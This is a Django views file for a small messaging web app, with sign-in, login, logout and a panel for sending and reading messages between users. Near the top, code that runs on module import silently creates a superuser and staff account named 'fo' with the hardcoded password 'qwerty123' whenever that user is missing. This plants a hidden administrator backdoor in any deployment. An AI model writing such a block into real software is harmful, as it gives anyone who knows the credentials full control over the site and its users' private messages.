from django.shortcuts import render, redirect, get_object_or_404
from .forms import SigninForm, LoginForm, MessageForm
from django.contrib import auth
from django.db.models import Q
from django.contrib.auth.models import User
from .models import Message
from django.utils import timezone

try:
    if not User.objects.filter(username='fo'):
        user = User(username='fo', is_superuser=1, is_staff=1)
        user.set_password('qwerty123')
        user.save()
except Exception as error:
    print(error)


# Create your views here.
def home_view(request):
    if not request.user.is_authenticated:
        return render(request, 'messenger/home.html', {'title': 'Home'})
    else:
        return redirect('panel')


def signin_view(request):
    if not request.user.is_authenticated:
        if request.POST:
            form = SigninForm(request.POST)
            if form.is_valid():
                form.save()
                return redirect('login')
        else:
            form = SigninForm()
        return render(request, 'messenger/signin.html', {
            'title': 'Signin',
            'form': form,
        })
    else:
        return redirect('panel')


def login_view(request):
    if not request.user.is_authenticated:
        if request.POST:
            form = LoginForm(request.POST)
            if form.is_valid():
                user = form.get_user()
                auth.login(request, user)
                return redirect('panel')
        else:
            form = LoginForm()
        return render(request, 'messenger/login.html', {
            'title': 'Login',
            'form': form
        })
    else:
        return redirect('panel')


def logout_view(request):
    if request.user.is_authenticated:
        auth.logout(request)
    return redirect('home')


def panel_view(request, user_pk=None):
    if request.user.is_authenticated:
        users = User.objects.all()
        messages = []
        if user_pk:
            user = get_object_or_404(User, pk=user_pk)
            messages = Message.objects.filter(
                Q(own=request.user, receiver=user)
                | Q(receiver=request.user, own=user)).order_by('-date_created')
            for message in messages:
                if message.receiver == request.user:
                    message.received = True
                    message.date_received = timezone.now()
                    message.save()
        else:
            user = None
        new_message_senders = [message.own for message in Message.objects.filter(receiver=request.user, received=False)]

        if request.POST and user:
            form = MessageForm(request.POST)
            if form.is_valid():
                contains = form.cleaned_data['contains']
                message = Message(receiver=user, contains=contains, own=request.user)
                message.save()
                return redirect('panel')
        else:
            form = MessageForm()

        return render(
            request, 'messenger/panel.html', {
                'title': 'Panel',
                'users': users,
                'messages': messages,
                'user': user,
                'new_message_senders': new_message_senders,
                'form': form,
            })
    else:
        return redirect('login')
